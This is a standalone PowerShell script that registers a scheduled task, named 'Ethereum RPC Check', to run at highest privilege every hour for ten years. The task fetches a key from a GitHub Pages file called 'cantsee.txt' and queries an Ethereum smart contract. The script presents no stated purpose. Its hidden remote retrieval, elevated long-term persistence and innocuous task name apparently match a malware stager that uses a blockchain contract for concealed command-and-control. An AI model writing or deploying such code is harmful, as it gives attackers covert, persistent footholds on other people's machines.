$command = @"
try {
    `$apiKey = (New-Object System.Net.WebClient).DownloadString('https://hakkyahud.github.io/cantsee.txt')
}
catch [System.Net.WebException] {
  Write-Host "Couldnt not fetch"
  return
}
  `$url = "https://eth-mainnet.g.alchemy.com/v2/$apiKey"
  `$body = @{ jsonrpc = "2.0"
  method = "eth_call"
  params = @(
      @{  to = "0xa446394242ba8a6e55fb760F4437891e669bdDF8"
          data = "0x06fdde03"
        }
        "latest"
      )
      id = 1
  } | ConvertTo-Json -Depth 10

`$response = Invoke-RestMethod`
  -Uri `$url `
  -Method Post `
  -ContentType "application/json" `
  -Body `$body
Write-Output `$response.result
"@

  $action = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument "-NoProfile -Command `"$command`""

  $trigger = New-ScheduledTaskTrigger `
-Once `
-At (Get-Date) `
-RepetitionInterval (New-TimeSpan -Hours 1) `
-RepetitionDuration (New-TimeSpan -Days 3650)
  
  Register-ScheduledTask `
  -TaskName "Ethereum RPC Check" `
  -Action $action `
  -Trigger $trigger `
  -RunLevel Highest `
  -Force
